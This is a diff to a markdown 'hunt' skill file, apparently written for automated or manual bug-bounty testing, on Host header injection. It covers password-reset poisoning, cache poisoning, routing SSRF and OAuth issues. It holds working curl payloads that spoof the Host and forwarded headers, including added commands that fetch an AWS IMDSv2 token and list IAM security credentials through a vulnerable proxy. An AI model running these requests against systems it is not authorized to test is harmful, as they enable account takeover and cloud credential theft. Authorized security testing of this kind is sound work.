@@ -1,6 +1,6 @@
 ---
 name: hunt-host-header
-description: "Hunt Host Header Injection — password reset poisoning → ATO, web cache poisoning via unkeyed Host/X-Forwarded-Host, routing-based SSRF (Host picks upstream → cloud metadata/internal services), path-override SSRF/ACL-bypass (X-Original-URL/X-Rewrite-URL), OAuth redirect_uri/issuer poisoning, and absolute-URL link poisoning in emails. High to Critical when it reaches ATO or mass cache poisoning. Built on public Host-header research (PortSwigger 'Practical web cache poisoning' + James Kettle, and the classic password-reset-poisoning class). Use on any forgot-password flow, CDN/reverse-proxy-fronted app, OAuth/OIDC endpoint, or absolute-URL-in-email feature."
+description: "Hunt Host Header Injection — password reset poisoning → ATO, web cache poisoning via unkeyed Host/X-Forwarded-Host, routing-based SSRF (Host picks upstream → cloud metadata/internal services), app-side Host fetch (SSR / Server Actions redirect), path-override SSRF/ACL-bypass (X-Original-URL/X-Rewrite-URL), OAuth redirect_uri/issuer poisoning, and absolute-URL link poisoning in emails. High to Critical when it reaches ATO or mass cache poisoning. Built on public Host-header research (PortSwigger 'Practical web cache poisoning' + James Kettle, and the classic password-reset-poisoning class). Use on any forgot-password flow, CDN/reverse-proxy-fronted app, OAuth/OIDC endpoint, or absolute-URL-in-email feature."
 sources: portswigger_research, hackerone_public
 report_count: 16
 ---
@@ -24,9 +24,10 @@ Ground the write-up in the behavior you reproduced (PortSwigger / Kettle cache-p
    - Email / invite / webhook / "copy link" → reset poisoning (phase A).
    - HTML or redirect on a cached response → cache (phase B). Confirm with `hunt-cache-poison` rules.
    - Proxy that dials the Host value → routing SSRF (phase C).
+   - App itself fetches `https://$Host/...` (SSR / Server Action redirect) → app-side fetch (phase C, second block).
    - Edge path ACL, app honors `X-Original-URL` or `X-Rewrite-URL` → path override (phase D). This does **not** combine with `Host: 169.254.169.254`.
    - OAuth/OIDC issuer or `redirect_uri` → phase E.
-2. **Hit the origin.** On a CDN, replacing `Host` often never reaches the app (SNI / vhost mismatch). Keep the real `Host` and add `X-Forwarded-Host`. Direct `Host` override is for origin or for a proxy that routes on it.
+2. **Hit the origin.** On a CDN, replacing `Host` often never reaches the app (SNI / vhost mismatch). Keep the real `Host` and add one forwarded header at a time: `X-Forwarded-Host`, then `X-Original-Host`, `X-Forwarded-Scheme` / `X-Forwarded-Proto`, `X-Forwarded-Prefix`, and on Azure App Service / Front Door also `DISGUISED-HOST`. Direct `Host` override is for origin or for a proxy that routes on it.
 3. **Unique marker** in the injected host: `h-<uniq>.collab.example` or your Collaborator domain. Search the email, the body, and `Location`.
 4. **Stop** at the first phase that meets validation.
 
@@ -42,7 +43,12 @@ curl -s -X POST "https://TARGET/forgot-password" -H "Host: TARGET" \
 curl -s -X POST "https://TARGET/forgot-password" \
   -H "Host: TARGET.h-UNIQ.collab" -d "email=YOUR_TEST_ACCOUNT"
 ```
-Also try `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, a second `Host` line (some stacks keep the last), and `Host: TARGET:1` / `Host: TARGET:@h-UNIQ.collab` when a parser splits on `:` or `@`.
+Also try `X-Host`, `X-Original-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `DISGUISED-HOST: h-UNIQ.collab`, `X-Forwarded-Scheme: http`, `X-Forwarded-Prefix: https://h-UNIQ.collab`, a second `Host` line (some stacks keep the last), and `Host: TARGET:1` / `Host: TARGET:@h-UNIQ.collab` when a parser splits on `:` or `@`. Absolute-form request line, connection still to the real host:
+
+```bash
+curl -s --request-target "http://h-UNIQ.collab/forgot-password" -X POST "https://TARGET/forgot-password" \
+  -H "Host: TARGET" -d "email=YOUR_TEST_ACCOUNT"
+```
 
 **Proof:** the message in **your** inbox contains the token on `h-UNIQ.collab` (or a Collaborator hit when you open the link). A reflected host in the HTTP response is not enough — mailers often pin `SITE_URL`. `X-Forwarded-Proto: http` matters when the token then leaks via `Referer` or a mixed-content load; show that leak, do not assume it.
 
@@ -59,7 +65,19 @@ curl -s "https://TARGET/computeMetadata/v1/" -H "Host: metadata.google.internal"
 curl -s "https://TARGET/metadata/instance?api-version=2021-02-01" -H "Host: 169.254.169.254" -H "Metadata: true"
 curl -s "https://TARGET/" -H "Host: UNIQUE.collab"
 ```
-**Proof:** metadata body (`ami-id`, `instance`, `computeMetadata`) or an internal app body you can quote. A Collaborator DNS/HTTP hit proves the proxy **resolved** the host — claim SSRF reachability, not metadata theft. IMDSv2 `401` means you reached IMDS and did not get a role. GCP/Azure headers are required; if this sink cannot add them, do not claim those clouds.
+**Proof:** metadata body (`ami-id`, `instance`, `computeMetadata`) or an internal app body you can quote. A Collaborator DNS/HTTP hit proves the proxy **resolved** the host — claim SSRF reachability, not metadata theft. An IMDSv2 `401` means you reached IMDS and did not get a role yet. One token hop, then stop:
+
+```bash
+TOK=$(curl -s -X PUT "https://TARGET/latest/api/token" -H "Host: 169.254.169.254" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
+curl -s "https://TARGET/latest/meta-data/iam/security-credentials/" \
+  -H "Host: 169.254.169.254" -H "X-aws-ec2-metadata-token: $TOK"
+```
+
+If the proxy drops `PUT` or the token header, report reachability only. GCP/Azure headers are required; if this sink cannot add them, do not claim those clouds.
+
+**App-side fetch (not the proxy).** Distinct from routing: the *application* builds `https://$Host/...` (or `X-Forwarded-Host`) and then GETs it — SSR, Server Actions `redirect()`, origin re-fetch after a 302, sitemap, webhook retry. Hit origin with `Host: UNIQUE.collab` **or** keep the real `Host` and spoof `X-Forwarded-Host` / `X-Forwarded-Proto`. Serve a 302 from Collaborator to one internal URL if you need a body.
+**Proof:** HTTP on Collaborator from the **app** IP (not only resolver DNS), or an internal body in the app's response. A reflected Host string with no outbound fetch is Phase A/B, not this.
 
 ## Phase D — path override
 
@@ -94,6 +112,7 @@ False friends: CDN error page that echoes `Host`; `Vary` including the header (k
 - Reset token → one login as **your** user to prove the token works, then describe the victim path. Do not take over a third party.
 - Cached absolute script URL → `hunt-xss` once, on the cache-buster.
 - Routing SSRF → `hunt-ssrf` impact rules (IMDSv2, one internal request).
+- App-side Host fetch → same `hunt-ssrf` bar; the callback IP must be the app, not only a resolver.
 - `X-Original-URL` → `hunt-auth-bypass` only with the internal response quoted.
 - OIDC `jwks_uri` on your host → token forgery only if you actually mint a token the API accepts. One request.
 
